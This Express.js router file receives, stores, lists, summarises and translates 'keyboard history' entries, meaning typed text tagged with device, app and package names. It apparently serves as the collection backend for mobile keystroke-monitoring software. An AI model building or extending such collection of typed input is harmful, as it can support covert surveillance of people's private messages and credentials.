const express = require('express');
const router = express.Router();
const KeyboardHistory = require('../models/KeyboardHistory');
const { authenticateApiKey } = require('../middleware/auth');

// Try to require translationUtil, but handle gracefully if not found
let translateTextInput;
try {
    const translationUtil = require('../utils/translationUtil');
    translateTextInput = translationUtil.translateTextInput;
} catch (err) {
    console.warn('⚠️ Translation util not found, translation will be skipped:', err.message);
    translateTextInput = async (text) => ({ success: false, error: 'Translation not available' });
}

// POST /api/keyboard-history - Save keyboard history entry
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        console.log('📝 Received keyboard history payload:', JSON.stringify(req.body, null, 2));

        const {
            id,
            source,
            content,
            timestamp,
            packageName,
            appName,
            deviceId,
            inputType,
            captureTime,
            scanType
        } = req.body;

        // Validate required fields
        if (!id || !source || !content || !timestamp || !packageName || !appName || !deviceId || !inputType) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: id, source, content, timestamp, packageName, appName, deviceId, inputType'
            });
        }

        // Create keyboard history entry
        const keyboardHistoryData = {
            id,
            source,
            content,
            timestamp,
            packageName,
            appName,
            deviceId,
            inputType,
            captureTime: captureTime || Date.now(),
            scanType: scanType || 'keyboard_history'
        };

        // Save to database (upsert to avoid duplicates)
        const savedHistory = await KeyboardHistory.findOneAndUpdate(
            { id: id },
            keyboardHistoryData,
            { upsert: true, new: true, runValidators: true }
        );

        console.log('✅ Keyboard history saved:', savedHistory.id);

        // Translate content to English using Groq
        try {
            const translationResult = await translateTextInput(content || '');
            if (translationResult.success && !translationResult.isEnglish) {
                savedHistory.contentEN = translationResult.translation;
                await savedHistory.save();
                console.log('✅ Translated keyboard history content to English using Groq');
            } else if (translationResult.success && translationResult.isEnglish) {
                savedHistory.contentEN = content || '';
                await savedHistory.save();
                console.log('✅ Keyboard history content is already in English');
            }
        } catch (translationError) {
            console.error('❌ Failed to translate keyboard history:', translationError.message);
        }

        res.status(201).json({
            success: true,
            message: 'Keyboard history saved successfully',
            data: {
                id: savedHistory.id,
                source: savedHistory.source,
                content: savedHistory.content,
                timestamp: savedHistory.timestamp,
                packageName: savedHistory.packageName,
                appName: savedHistory.appName,
                deviceId: savedHistory.deviceId,
                inputType: savedHistory.inputType,
                captureTime: savedHistory.captureTime,
                scanType: savedHistory.scanType,
                createdAt: savedHistory.createdAt,
                updatedAt: savedHistory.updatedAt
            }
        });

    } catch (error) {
        console.error('❌ Error saving keyboard history:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /api/keyboard-history - Get keyboard history with pagination and filtering
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        const {
            page = 1,
            limit = 50,
            deviceId,
            packageName,
            source,
            inputType,
            startDate,
            endDate
        } = req.query;

        const offset = (parseInt(page) - 1) * parseInt(limit);
        const query = {};

        // Build query filters
        if (deviceId) query.deviceId = deviceId;
        if (packageName) query.packageName = packageName;
        if (source) query.source = source;
        if (inputType) query.inputType = inputType;

        // Date range filter
        if (startDate || endDate) {
            query.timestamp = {};
            if (startDate) query.timestamp.$gte = parseInt(startDate);
            if (endDate) query.timestamp.$lte = parseInt(endDate);
        }

        // Get total count
        const totalCount = await KeyboardHistory.countDocuments(query);

        // Get keyboard history entries
        const keyboardHistory = await KeyboardHistory.find(query)
            .sort({ timestamp: -1 })
            .skip(offset)
            .limit(parseInt(limit))
            .lean();

        res.json({
            success: true,
            data: keyboardHistory,
            pagination: {
                page: parseInt(page),
                limit: parseInt(limit),
                totalCount,
                totalPages: Math.ceil(totalCount / parseInt(limit))
            }
        });

    } catch (error) {
        console.error('❌ Error fetching keyboard history:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /api/keyboard-history/stats - Get keyboard history statistics
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId } = req.query;

        const matchQuery = deviceId ? { deviceId } : {};

        const stats = await KeyboardHistory.aggregate([
            { $match: matchQuery },
            {
                $group: {
                    _id: null,
                    totalEntries: { $sum: 1 },
                    uniqueDevices: { $addToSet: '$deviceId' },
                    uniqueApps: { $addToSet: '$packageName' },
                    sources: { $addToSet: '$source' },
                    inputTypes: { $addToSet: '$inputType' },
                    latestEntry: { $max: '$timestamp' },
                    oldestEntry: { $min: '$timestamp' }
                }
            },
            {
                $project: {
                    _id: 0,
                    totalEntries: 1,
                    uniqueDevices: { $size: '$uniqueDevices' },
                    uniqueApps: { $size: '$uniqueApps' },
                    sources: 1,
                    inputTypes: 1,
                    latestEntry: 1,
                    oldestEntry: 1
                }
            }
        ]);

        res.json({
            success: true,
            data: stats[0] || {
                totalEntries: 0,
                uniqueDevices: 0,
                uniqueApps: 0,
                sources: [],
                inputTypes: [],
                latestEntry: null,
                oldestEntry: null
            }
        });

    } catch (error) {
        console.error('❌ Error fetching keyboard history stats:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// POST /api/keyboard-history/translate/:id - Translate keyboard history content
router.post('/translate/:id', authenticateApiKey, async (req, res) => {
    try {
        const historyId = req.params.id;
        
        const keyboardHistory = await KeyboardHistory.findById(historyId);
        if (!keyboardHistory) {
            return res.status(404).json({
                success: false,
                message: 'Keyboard history entry not found'
            });
        }

        const translationResult = await translateTextInput(keyboardHistory.content || '');
        
        if (!translationResult.success) {
            return res.status(400).json({
                success: false,
                message: 'Translation failed',
                error: translationResult.error
            });
        }

        // Update the entry with translation
        keyboardHistory.contentEN = translationResult.translation;
        await keyboardHistory.save();

        res.json({
            success: true,
            message: 'Translation completed successfully',
            data: {
                id: keyboardHistory.id,
                originalContent: keyboardHistory.content,
                translatedContent: translationResult.translation,
                originalLanguage: translationResult.originalLanguage,
                isEnglish: translationResult.isEnglish
            }
        });

    } catch (error) {
        console.error('❌ Error translating keyboard history:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

module.exports = router;
